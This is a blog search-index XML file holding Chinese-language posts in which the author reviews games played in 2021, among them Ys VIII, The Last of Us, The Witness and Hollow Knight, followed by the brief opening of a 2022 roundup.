<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2021年游戏总结 下</title>
    <url>/2022/01/10/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8B/</url>
    <content><![CDATA[<p>本文承接上文，继续聊聊 2021 年我所体验的一些游戏。</p>
<span id="more"></span>

<h1 id="伊苏8：丹娜的陨涕日"><a href="#伊苏8：丹娜的陨涕日" class="headerlink" title="伊苏8：丹娜的陨涕日"></a>伊苏8：丹娜的陨涕日</h1><p>今年玩过最喜欢的 jrpg 作品，几乎满足了我对于一款优秀 jrpg 的全部幻想。</p>
<p><img src="/2022/01/10/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8B/ys.jpg"></p>
<p>战斗方面爽快而又不失深度。伊苏系列向来以高速的即时制战斗著称，本作也不例外，角色与敌人的动作都相对较快，技能无冷却加之技能槽的回复速度很快，因此本作的战斗与大部分 jrpg 讲究策略的慢节奏战斗有很大不同。但这并不意味着本作战斗就十分无脑，弹反、极限闪避、弱点属性等机制的加入很好的提升了战斗系统的深度。</p>
<p>本作的剧情也很优秀。剧情悬念设置十分得当，给予玩家很强的故事驱动力，人物塑造极佳，进一步增强代入感。</p>
<p>本作最值得夸赞的还是地图探索方面的体验。本作采用的是一个非常典型的“银河恶魔城”式的地图设计，玩家需要探索地图的各个角落，从而解锁新的能力，再次进行更深一步的探索。同时本作探索不光局限于对于物品的获取，还包括了 npc 的发现，这一切与 jrpg 的强故事驱动相结合，使得探索欲望进一步上升。</p>
<p><img src="/2022/01/10/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8B/ys2.jpg"></p>
<p>最后讲讲我对于本作不满的地方。首先是本作的保卫战部分，这部分实属多余，不仅不有趣，还很大程度破坏了地图探索的连贯性与叙事节奏，纯粹只是一个获取资源的方式罢了。其次就是画面表现了，我其实并不是一个重视游戏画面表现的玩家，但无奈本作或者说 falcom 社的画面表现实在是惨不忍睹，人物建模、场景基本就是 ps2 时代水平了。但如果对此毫不在意，那《伊苏8》绝对是一款非常优秀的 jrpg 游戏。</p>
<h1 id="晶体管"><a href="#晶体管" class="headerlink" title="晶体管"></a>晶体管</h1><p>制作十分精良的独立游戏，完成度很高。</p>
<p><img src="/2022/01/10/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8B/jtg.jpg"></p>
<p>优秀的美术和音乐自不必多说。本作最让人眼前一亮的还是那一套基于函数搭配和指令战略的一套战斗系统，这套系统本身就具有就具有很高的可玩性，同时各函数的效果还可以叠加成为新的函数，使得战斗的策略性十分丰富。</p>
<p><img src="/2022/01/10/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8B/jtg2.jpg"></p>
<p>本作的开发商正是开发了近年获奖无数的《哈迪斯》的 Supergiant 工作室。这非常喜欢这家工作室，不仅因为他们惊艳的美术设计，以及他们对于游戏的精雕细琢，更在于他们敢于跳出自己的舒适圈，不断尝试新的游戏类型。他们团队这十余年开发的四部作品，每一部的类型都不尽相同：从传统的 ARPG 《堡垒》，到融入了策略要素的 《晶体管》，再到融入了体育竞技要素的《柴薪》，而《哈迪斯》又是款 Roguelike 游戏，这种不拘泥于现有成功的精神真的值得所有的游戏开发者学习，《哈迪斯》如今能取得如此大的成功也可谓是众望所归。</p>
<h1 id="尼尔：自动人形-amp-人工生命"><a href="#尼尔：自动人形-amp-人工生命" class="headerlink" title="尼尔：自动人形 &amp; 人工生命"></a>尼尔：自动人形 &amp; 人工生命</h1><p>《尼尔：自动人形》对我而言是一款特别的作品，它是我最早接触的主机游戏，也是真正让我爱上主机游戏的作品。</p>
<p><img src="/2022/01/10/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8B/nier.jpg"></p>
<p><img src="/2022/01/10/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8B/nier2.jpg"></p>
<p>事实上，我第一次游玩本作时由于种种原因并没有通关。但在去年《人工生命》的高清复刻版发售前，我又将本作重新拾起并最终通关。平心而论，《尼尔：自动人形》是一个优点和缺点都十分明显的作品。优点显而易见，MONACA 的音乐、横尾太郎的剧本以及白金的动作系统，使得本作有一个非常好的底子。但缺点也非常明显，粗糙的场景建模、遍布整个地图的空气墙，以及重复跑图的任务。战斗系统虽然非常爽快，但战斗体验却并不好，后期堆怪现象比较严重。但《尼尔：自动人形》仍然属于佳作的范畴，值得推荐给所有玩家。</p>
<p><img src="/2022/01/10/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8B/nier3.jpg"></p>
<p>反观《尼尔：人工生命》的表现就不尽如人意了，作为系列的第一部作品，续作中的缺点基本继承自前作，同样的空气墙和重复跑图。此外，一代由于时代限制，场景的规模很小，地图虽然看似广袤，但实际上真正可以到达的区域很少，相比续作的开放式地图要差很多。并且由于失去了与白金合作的动作系统，即便是在高清复刻版中对原作的系统加以改进，本作的战斗仍然比较无聊。因此，本作只推荐给想要补全系列剧情的玩家。</p>
<p><img src="/2022/01/10/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8B/nier4.jpg"></p>
<h1 id="神秘海域3-amp-失落的遗产"><a href="#神秘海域3-amp-失落的遗产" class="headerlink" title="神秘海域3 &amp; 失落的遗产"></a>神秘海域3 &amp; 失落的遗产</h1><p>《神秘海域》系列补完计划的最后两作。</p>
<p><img src="/2022/01/10/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8B/sh.jpg"></p>
<p><img src="/2022/01/10/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8B/sh2.jpg"></p>
<p>在前年通关《神秘海域4》之后，我被其成熟的电影化运镜与出色的动作系统所折服，就想要补完系列的正传作品，在通关了《失落的遗产》之后，这个计划总算基本完成（初代未通关，动作系统和画面表现难以接受），因此想聊聊我对于这个系列的看法。</p>
<p>和相似类型的《古墓丽影》重启三部曲相比较，神海系列显得更加纯粹，它不会出现《古墓丽影》中的支线任务、武器强化、能力加点等繁杂事项，所有的一切均为故事服务，游戏中基本没有任何的 ui 界面，主线任务的推进也主要靠着视觉上的引导。如果把新古墓三部曲比作电影化的游戏，那神海系列更像是游戏化的电影。</p>
<p><img src="/2022/01/10/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8B/sh3.jpg"></p>
<p>这个系列每一作都带给玩家一场跌宕起伏的冒险旅程，2代的香巴拉，3代的千柱之城，4代埃弗瑞的宝藏，失落遗产的印度，无一不给玩家留下深刻的印象。但这类型的游戏受技术力的影响很大，PS3 时期的三部曲虽然当时广受赞誉，《神秘海域2》更是获得了当年的 TGA 年度游戏，但以现在的眼光来看，较为落后的画面和动作，加上如今大量游戏都纷纷采用了电影化的叙事方式，现在游玩已经很难体验到当年玩家所体验到的震撼了。这也是这一类型游戏的缺陷，《失落的遗产》中出现的一些与前作类似的情节确实是让人有些审美疲劳了，顽皮狗显然也是意识到了这一点，正式完结了这个系列，在我看来是非常明智的决定。</p>
<p><img src="/2022/01/10/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8B/sh4.jpg"></p>
<h1 id="最后生还者1-amp-2"><a href="#最后生还者1-amp-2" class="headerlink" title="最后生还者1 &amp; 2"></a>最后生还者1 &amp; 2</h1><p>电影化动作冒险游戏的最高峰，真正意义上的杰作。</p>
<p><img src="/2022/01/10/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8B/tlou.jpg"></p>
<p><img src="/2022/01/10/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8B/tlou2.jpg"></p>
<p>如果说《神秘海域》系列带给玩家的情感体验只来源于感官上的刺激，那么《最后生还者》系列带给玩家的则是心灵上的震撼。不同于神海系列较为轻松的夺宝旅程，《最后生还者》讲述的则是末世下人与人的关系。与大多数类似末世题材作品致力于展现世界观不同，本系列更多关注的是 The Last of Us 中的 <strong>us</strong>，讲好一个相对小格局的故事，充分调动玩家的情感才是本系列的目的。因此本系列虽然是一个第三人称视角的游戏，但其实游戏内的视角仅仅局限在主角，玩家无法得知主角之外所发生的故事，从而让角色与玩家产生共鸣，从而带来极致的情感体验。初代也因此广受赞誉，被无数玩家奉为神作。</p>
<p><img src="/2022/01/10/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8B/tlou3.jpg"></p>
<p>但二代在充分继承一代框架的基础上，却带来了完全不同的效果，玩家间的评价两极分化，甚至引发了游戏圈中大规模的争论。造成这一切的原因同样是本系列的特点——强烈的情感冲击。一代由于是新 ip，故事上也没有很大的包袱，结局虽然存在争议，但并没有掀起风波。而二代的剧情实在过于极端，同时在对玩家情感上的冲击要远胜于一代，加之剧本上存在的逻辑漏洞与叙事混乱，最终使得游戏带给玩家的情绪被愤怒所填充，造成了两级分化。可以说，这样情况的出现可以说并不意外，强烈的情感体验正是系列所追求的，因此二代的故事带给玩家的如果不是像一代那样的正面反馈，那就是及其负面的反馈，而绝不可能是平淡。</p>
<p>即便我同样对二代的剧本不满意，但综合系列游戏极高的制作水准（尤其是二代）与带给玩家的情感冲击，这系列都值得推荐给所有的玩家。</p>
<p><img src="/2022/01/10/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8B/tlou4.jpg"></p>
<h1 id="零：濡鸦之巫女"><a href="#零：濡鸦之巫女" class="headerlink" title="零：濡鸦之巫女"></a>零：濡鸦之巫女</h1><p>美型的日式恐怖游戏，故事、氛围和恐怖感的营造都深得我心。</p>
<p><img src="/2022/01/10/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8B/zero.jpg"></p>
<p>这个系列的核心机制——射影机系统可谓是恐怖游戏类型中一个非常经典且优秀的设计了，既很好的服务于恐怖感，又兼具很强的娱乐性。给怨灵拍照这一机制迫使玩家必须直面恐惧，带来了第一人称视角下的压迫感。同时这一机制需要玩家通过旋转相机达到伤害的最大化，这一过程本身也很有趣。另外操作方面最好使用带体感功能的手柄，不仅操作比较方便，还能很大程度上提升代入感。</p>
<p><img src="/2022/01/10/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8B/zero2.jpg"></p>
<p>本作的美型人设本来应该是加分项，但是也很大程度上降低游戏的恐怖感，到了《濡鸦之巫女》这一作可以说恐怖感非常低了，推荐因为恐怖而不敢尝试本作的玩家游玩。但原作毕竟还是老游戏的移植，视角转换方面感觉没有做很多优化，操作还是比较难受，需要时间适应。</p>
<p>通关本作后，我是真的喜欢上了这个系列，喜欢系列独特的氛围以及凄美的故事。这次移植大概也是在为续作的开发试水，毕竟这个系列虽然在恐怖游戏圈内名声不小，但实际销量却非常惨淡，希望今后能够等到到续作的到来。</p>
<p><img src="/2022/01/10/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8B/zero3.jpg"></p>
<h1 id="绯红结系"><a href="#绯红结系" class="headerlink" title="绯红结系"></a>绯红结系</h1><p>一部有亮点但整体体验并不好的作品。</p>
<p><img src="/2022/01/10/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8B/fh.jpg"></p>
<p>本作的战斗系统可以说非常出色，兼顾了演出效果与操作感。战斗系统本身并不复杂易上手，动作招式的整体反馈非常优秀，特效与动画间的配合十分完美，尤其 xbox 版本居然还适配了扳机震动，使得打击反馈进一步提升。本作在战斗方面的体验绝对称得上优秀。</p>
<p>但基本上本作能为之称道的也仅限于此了，其他方面表现得实在不尽如人意。首先是叙事，在我看来 PPT 式过场动画并不是本作叙事上的缺点，本作叙事结构本身非常混乱，剧情推动和人物动机不明不白。羁绊章节的加入也是把双刃剑，一方面确实丰满了人物性格，弥补了主线故事中人物塑造上的不足；但同时这部分内容与主线故事的割裂非常严重，以至于出现前一秒还在相互厮杀，后一秒就一起谈笑风生的情节。</p>
<p><img src="/2022/01/10/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8B/fh2.jpg"></p>
<p>此外，本作本质上还是一个数值驱动的 arpg 而并非传统的 act 类型，因此装备构筑部分也值得关注。但本作这方面做得并不好，人物的 build 部分还是过于简单，没有什么可供挖掘的深度。</p>
<p>感觉本作还是一个偏实验性质的作品，有亮点，但是大部分内容都显然没有经过打磨。</p>
<h1 id="刺客信条：起源"><a href="#刺客信条：起源" class="headerlink" title="刺客信条：起源"></a>刺客信条：起源</h1><p>个人第一部通关的《刺客信条》。</p>
<p><img src="/2022/01/10/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8B/ac.jpg"></p>
<p>本作前期的体验可以说非常好，场景设计非常宏伟壮观，很好的还原了古埃及建筑的风貌。古墓探索设计还算不错，虽然古墓中谜题并不有趣，但探索本身就已充满乐趣。开放世界非常宽广，各地风格迥异，让人很有开图的欲望。</p>
<p><img src="/2022/01/10/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8B/ac2.jpg"></p>
<p>但以上所述的这些优点更多来自于画面效果和题材本身所带来的体验，越玩到后期，游戏的很多问题就逐渐显露出来。首先是叙事，剧情本身就不具备很强的吸引力，加上叙事的表现力太弱，使得剧情所带来的驱动力不足。</p>
<p>其次战斗系统缺乏深度和乐趣，不足以承载起后期大量的重复战斗。对比同样是开放世界“清据点式”任务的《对马岛之魂》，后者虽然战斗同样缺乏深度，但其战斗本身更加有趣，并且合理控制了战斗的密度，使得战斗的体验要远胜于本作。</p>
<p><img src="/2022/01/10/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8B/ac3.jpg"></p>
<p>最后，也是我最难以忍受的一点，就是等级压制过于严重。如果只做主线任务，玩家无法达到继续推进主线任务的推荐等级，而且等级之间的数值差距非常悬殊，通常越个两三级就很容易被秒杀。但支线任务往往并不有趣，这使得后期的游戏体验直线下降，只想快速通关。</p>
]]></content>
      <categories>
        <category>游戏</category>
      </categories>
      <tags>
        <tag>游戏</tag>
        <tag>闲谈</tag>
      </tags>
  </entry>
  <entry>
    <title>2021年游戏总结 上</title>
    <url>/2022/01/05/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8A/</url>
    <content><![CDATA[<p>​    转眼间 2021 年已经过去，这一年间也体验了很多不同平台、不同类型的作品。本文将对此做一个小小的总结，内容主要是个人对 2021 年玩过的游戏的一些个人想法。此外，由于篇幅受限，因此并不会包含所有的游戏，部分体验不够深入的或者无话可聊的游戏将不会出现。</p>
<span id="more"></span>

<h1 id="双人成形"><a href="#双人成形" class="headerlink" title="双人成形"></a>双人成形</h1><p>这算是今年玩过的最开心的游戏了，和两个室友花了大概 15 小时通关。</p>
<p><img src="/2022/01/05/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8A/itk1.jpg"></p>
<p>游戏在本身的关卡设计就很优秀，在融合了双人机制下更加显得精妙。且游戏对于资源的利用可谓毫不吝啬，每一大关就完全舍弃掉之前机制，完全变成“另一个游戏”。虽然这样各种机制浅尝辄止的设计理念可能会带来所谓的游戏深度不足，但这并不是本作所追求的，本作就是想给玩家一个极为丰富的一周目流程。仔细想想现在很多游戏的流程越来越长，但很多内容都是注水的，玩家在这些重复劳动的过程中可能会对游戏失去兴趣，最终导致游戏烂尾。而双人成形就是一个每个关卡细节精心编排打磨，每种机制总能在玩家感到无聊之前及时结束，从而转向新的机制。我在实际游戏过程中的感受也是如此，对之后关卡机制的期待是我在现在大部分游戏中所体会不到的。</p>
<p><img src="/2022/01/05/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8A/itk2.jpg"></p>
<p>还有一点值得提的就是本作的箱庭式关卡设计，几乎每个关卡都会有一个箱庭式的“游乐园”以供调节游戏节奏。这些箱庭式关卡中遍布着的大量可供游玩的小物件，很多都是童年时的一些小玩具，看到让人会心一笑。本作中唯一的收集元素也是可以游玩的，它们是一些双人对战的小游戏，例如打地鼠之类的，很大程度上增进了玩家之间的感情（bushi）。</p>
<h1 id="见证者"><a href="#见证者" class="headerlink" title="见证者"></a>见证者</h1><p>本作绝对是今年给我最大震撼的游戏，它让我认识一位偏执的布道者—— Jonathan Blow 以及他所贯彻的游戏哲学。</p>
<p><img src="/2022/01/05/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8A/wt1.jpg"></p>
<p>游戏最开始给人的印象只是一个简单的一笔画小游戏，但随着游戏进程的推进，玩家会发现基于这样一个极为简单的规则所衍生出的无数种可能性：例如镜像式的一笔画，将区域分块，构造指定形状等等。同时，部分谜题的设计不光基于 Pad（解题板） 本身，还与周围的环境相联系。有的谜题需要玩家在指定的角度观察才能看到答案；有的谜题则是将周围的环境进行抽象从而得到答案；还有的甚至需要根据环境的声音来得到答案。</p>
<p><img src="/2022/01/05/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8A/wt2.jpg"></p>
<p>不仅于此，本作所呈现出来的整体感更是极为难得的。游戏几乎没有任何的 ui 界面，玩家与对于场景的机关控制同样是根据本作的核心机制——一笔画来实现的，这样的设计看似没有什么用处，实际上却极大地使得整个游戏系统更加合理自洽。</p>
<p>事实上，本作的谜题并不仅仅局限于 Pad 上的抽象线条，而是这一规则融入了整个游戏的地图之中。在游戏中，玩家可以在地图的各个角落找到 Pad 上的“蝌蚪文”图案，并且作为游戏的隐藏要素而存在。而类似这样的环境谜题事实上是 Blow 本人最开始真正想做的内容，而 Pad 上的谜题反而是后来才加上去的。</p>
<p><img src="/2022/01/05/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8A/wt3.jpg"></p>
<p>《见证者》是一个非常反传统的游戏，它与市面上几乎所有的游戏都有所区别。它所追求的是无奖励机制，这意味着玩家在解决谜题后事实上几乎不会得到任何的直接奖励，它的奖励只是玩家对游戏系统更深的理解，从这一角度上说，《见证者》相比其它游戏来讲更加纯粹。玩家通关游戏之后，一切归为原点，留下的只是玩家对游戏规则的更深层次的认知。</p>
<p>整个《见证者》的旅途其实就是一场追寻真理的旅途。回想人类文明的发展历程，自然界中很多的现象和规律并不在某一时间节点突然出现，它们其实一直都存在，只是当时人们对于世界的认知过于浅显，对此并没有感知。《见证者》的游戏历程亦是如此，如果在通关后重新开始游戏流程会发现，很多环境谜题都存在于游戏较为前期的区域，甚至游戏游戏隐藏结局的入口就存在于游戏最早期的场景，只是当时的玩家并不会注意到这一切。这样的设计也与本作所要传达的思想高度契合。</p>
<h1 id="极限竞速：地平线5"><a href="#极限竞速：地平线5" class="headerlink" title="极限竞速：地平线5"></a>极限竞速：地平线5</h1><p>早就听过这个系列的大名，直到今年入了 Xbox Series S 后才真正入坑该系列。</p>
<p><img src="/2022/01/05/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8A/fh5.jpg"></p>
<p>本作作为半娱乐半拟真的竞速游戏，可以说几乎适合所有对竞速游戏不反感的人游玩。首先是辅助功能非常完备，玩家可以非常深度的对游戏的难度进行定制。不想要复杂操作的玩家可以将尽量开启辅助功能跑跑圈看看风景，而渴望拟真竞速的硬核玩家也可以关闭一定的辅助功能体验不断练习提升技术的过程。</p>
<p>这个系列之所以那么令人着迷以至于成为如今娱乐竞速游戏的天花板很大程度上要归功于这个在如今游戏业界显得不那么正面的“公式化开放世界”。事实上，本作的开放世界非常的公式化，场景中遍布着供处理的清单任务，有的是比赛，还有的是供收集的广告牌和房车宝物等等。但是由于本作实质上是一个竞速游戏，竞速游戏的核心玩法就是跑图，因此公式化开放世界所为人诟病的重复性高、跑图繁琐等缺点在本作中都不再是缺点，它们共同是构建起了整个游戏的 GamePlay 部分。</p>
<p>本系列可能不是最好的竞速游戏，但一定是玩起来最开心的竞速游戏。</p>
<p>以下是我在游玩过程中的部分截图。</p>
<p><img src="/2022/01/05/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8A/fh1.jpg"></p>
<p><img src="/2022/01/05/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8A/fh2.jpg"></p>
<p><img src="/2022/01/05/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8A/fh3.jpg"></p>
<p><img src="/2022/01/05/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8A/fh4.jpg"></p>
<h1 id="FIFA-21"><a href="#FIFA-21" class="headerlink" title="FIFA 21"></a>FIFA 21</h1><p>本作毫不意外的成为了我 2021 年游戏时间最长的游戏（第二是 FIFA 20）。</p>
<p><img src="/2022/01/05/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8A/fifa1.jpg"></p>
<p>作为年货足球游戏，在实况足球最新作转为免费游戏后算是真正成为了单机足球玩家的唯一选择了。游戏本身内容没有什么好聊的，简单聊聊它相比 FIFA 20 有哪些变化。</p>
<p>由于我几乎只玩生涯模式，因此也只关心生涯模式的变化。总而言之，本次生涯模式的改变并没有达到预期。比较大的一个改变是更改球员所踢的位置并且球员能力可以根据特定位置进行针对性的提升，这一点我觉得还是很不错的。此外球员的模拟训练会直接根据训练达到的最大评级自动进行，不用反复进行手动训练了，这也是一个比较好的改变。但印象中除此之外的改变就不明显了，尤其是球员生涯模式，几乎没有什么提升，还是糟糕的站位问题，仍然无法替补登场，位置设定仍然非常不合理。希望后面的作品能够有所改善。</p>
<h1 id="伊迪斯芬奇的记忆"><a href="#伊迪斯芬奇的记忆" class="headerlink" title="伊迪斯芬奇的记忆"></a>伊迪斯芬奇的记忆</h1><p>电子游戏相较于其他艺术形式的最主要区别在哪？答案是交互性。而《伊迪斯芬奇的记忆》就是这样一个利用游戏的交互性将叙事能力发挥到极致的作品。</p>
<p><img src="/2022/01/05/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8A/ef.jpg"></p>
<p>本作作为步行模拟器，并没有传统游戏中所谓的“玩法”，或者说，本作的玩法其实就是它的交互式叙事部分。游戏中的字幕并不像其它游戏那样作为 ui 层，独立于游戏之外，而是嵌入在游戏之中，作为一个整体，这样极大了提升游戏的沉浸感。</p>
<p><img src="/2022/01/05/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8A/ef2.jpg"></p>
<p>本作的叙事手法简直就是天马行空，利用十余个不同的表现形式极为自然的阐述了芬奇家族人们因为意外而去世的过程。死亡本是个无比沉重的话题，游戏中家族成员的死亡方式又基本是突然的意外死亡，游戏却用极为华丽的手法将死亡渲染的轰轰烈烈，并且这一切都与玩家的交互密切相关，真正将游戏这种艺术形式的特点发挥的淋漓尽致。</p>
<h1 id="小小梦魇2"><a href="#小小梦魇2" class="headerlink" title="小小梦魇2"></a>小小梦魇2</h1><p>综合素质非常优秀的恐怖冒险解谜游戏。《小小梦魇2》大体上沿袭了一代的框架，并没有做出什么比较大的改变，但整体的游玩体验上却比一代好上不少。</p>
<p><img src="/2022/01/05/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8A/lm1.jpg"></p>
<p>首先是谜题设计有一定提升。一代给我的感觉更偏向于动作冒险游戏，谜题的量不多且质量也一般，但二代在这方面有比较明显的提升。尤其部分关卡的隐性引导做得很好，十分自然地提示给玩家谜题的解决方案。</p>
<p><img src="/2022/01/05/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8A/lm2.jpg"></p>
<p>其次就是关卡节奏上，每个部分间的衔接过渡非常自然，潜入、逃脱、解密三者以一个非常合理的比例分配在整个游戏流程之中，让玩家时刻保持在心流状态下。本作流程并不长，我通关大概花了 7 小时，由于本作出色的节奏控制，我几乎是一口气通关的。</p>
<p><img src="/2022/01/05/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8A/lm3.jpg"></p>
<p>最后还想聊一聊这个系列的 3D 场景，本系列的 3D 场景无疑是把双刃剑。一方面它极大的增强了游戏的氛围和敌人的压迫感；但另一方面它使得系列的操作和跳跃判定十分糟糕，这些问题即使到了二代也依旧存在。因为角色与互动对象不在同一个 z 轴从而互动失败的情况屡屡发生。还有一点令人失望的部分在于本作的牵手系统更像是对上田文人《ico》的致敬，而并没有我最初想像的将其融合到游戏机制当中，但这也无伤大雅。综合来看，《小小梦魇2》绝对是一款不容错过的作品。</p>
<h1 id="空洞骑士"><a href="#空洞骑士" class="headerlink" title="空洞骑士"></a>空洞骑士</h1><p>独立游戏中的“大作”，本作的内容非常丰富并且完成度很高。</p>
<p><img src="/2022/01/05/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8A/hk1.jpg"></p>
<p>本作用一个不那么友好的词来形容就是“缝合怪”，大体框架继承自 Metroveinia 的自由探索玩法，死亡机制与隐性叙事又借鉴自《黑暗之魂》系列。但《空洞骑士》却不是一个拙劣模仿的产物，它很好的将这些要素加以融合，加之一定的微创新，最终形成了属于自己的一套框架。</p>
<p>我认为本作设计非常好的一个机制便是地图标记，玩家可以在一些当前需要特定能力解锁的区域添加特定的标记，以便后续针对性的探索。这样很好的解决了银河恶魔城游戏迷路的窘境，同时极大地增强了地图的探索欲望。本作的另一个亮点就是它的战斗系统，战斗系统虽然并不复杂，但是本作出色的手感调教和 boss 战设计使得这样简约而不简单的战斗十分流畅且具有观赏性。制作组显然也是知道本作的优势所在，于是在后面的版本中更新了 boss rush 模式，也成为了很多玩家研究练习的舞台。</p>
<p><img src="/2022/01/05/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8A/hk2.jpg"></p>
<p>但本作也并非做到完美，它在玩家体验层面上还是有很多不令人满意的部分。首先便是平台跳跃关卡，个人认为这个部分确实有些多余，主要原因还是本作的跳跃手感实在不敢恭维，加上这一部分与其它关卡体验上有些割裂。其次就是本作难度曲线控制并不平稳，很大程度上还是游戏对于玩家的关卡引导不够明确，玩家很容易陷入此时的关卡是否是主线目的地的困惑当中，这样的情况会遍布在游戏的整个流程，使得整个游戏流程体验较为破碎。</p>
<p>但本作的整体优异表现还是值得推荐给所有喜欢银河恶魔城游戏的玩家，话说<strong>丝之歌</strong>怎么就没消息了呢？</p>
<h1 id="影子工厂"><a href="#影子工厂" class="headerlink" title="影子工厂"></a>影子工厂</h1><p>《去月球》系列的第三部也可能是最后一部作品，又是一个美好且温馨的故事。</p>
<p><img src="/2022/01/05/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8A/if1.jpg"></p>
<p>本作故事上的冲击性可能没有前作《去月球》和《寻找天堂》来的强烈，但却是成为了我三部作品中最喜欢的一部。很大的原因是本作引入了更多叙事上的技法，悬念设计相较以往作品更为出色，最后以一个十分美好且令前作玩家震惊的方式将三部曲串联起来，为三部曲画上一个完美的句号（大概）。本作的故事值得反复回味，不得不佩服高瞰老师对于人物情感上的刻画，让一个比较普通的不能再普通的故事讲述的如此令人动容。</p>
<p><img src="/2022/01/05/2021%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93%20%E4%B8%8A/if2.jpg"></p>
<p>此外本作基本舍弃了那些与叙事无关的“小游戏”部分，个人认为这是非常明智的选择。前两作可能是为了更加贴近所谓的游戏，而比较强行地加入类似拼图等小游戏，但这些与游戏实际玩法割裂的部分在我看来实际上打乱了游戏的节奏。而本作在叙事上给我的感受就是流畅，全程无尿点，时刻都有一定的悬念吸引着玩家。</p>
<p>虽然本作与前两部作品在剧情上并无直接关联，但还是建议至少游玩前面任意一作体验会更好。</p>
]]></content>
      <categories>
        <category>游戏</category>
      </categories>
      <tags>
        <tag>游戏</tag>
        <tag>闲谈</tag>
      </tags>
  </entry>
  <entry>
    <title>2022年游戏总结</title>
    <url>/2023/01/12/2022%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>今年由于要准备考研，博客几乎没怎么更新，游戏玩的也比较少，算上填坑、试玩、弃坑的粗略计算大概 20 款，其中不乏近年的新游戏以及一直想补的老游戏，以下是从中选出的几款个人觉得比较有的聊的作品。</p>
<span id="more"></span>

<h1 id="勇者斗恶龙11s-寻觅逝去的时光"><a href="#勇者斗恶龙11s-寻觅逝去的时光" class="headerlink" title="勇者斗恶龙11s 寻觅逝去的时光"></a>勇者斗恶龙11s 寻觅逝去的时光</h1><p><img src="/2023/01/12/2022%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93/dq1.jpg"></p>
